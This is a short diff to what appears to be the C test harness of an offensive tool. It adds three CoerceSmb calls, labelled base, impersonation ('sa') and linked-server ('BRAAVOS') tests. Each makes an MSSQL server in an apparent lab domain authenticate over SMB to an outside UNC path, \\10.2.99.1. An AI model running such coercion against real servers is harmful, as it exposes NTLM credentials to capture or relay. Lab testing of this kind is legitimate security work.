@@ -114,7 +114,14 @@ VOID go(
 
 int main()
 {
-	CoerceSmb("192.168.0.215", "master", NULL, NULL, "\\\\10.2.99.1");
+	internal_printf("============ BASE TEST ============\n\n");
+	CoerceSmb("castelblack.north.sevenkingdoms.local", "master", NULL, NULL, "\\\\10.2.99.1");
+
+	internal_printf("\n\n============ IMPERSONATE TEST ============\n\n");
+	CoerceSmb("castelblack.north.sevenkingdoms.local", "master", NULL, "sa", "\\\\10.2.99.1");
+
+	internal_printf("\n\n============ LINK TEST ============\n\n");
+	CoerceSmb("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL, "\\\\10.2.99.1");
 }
 
 #endif
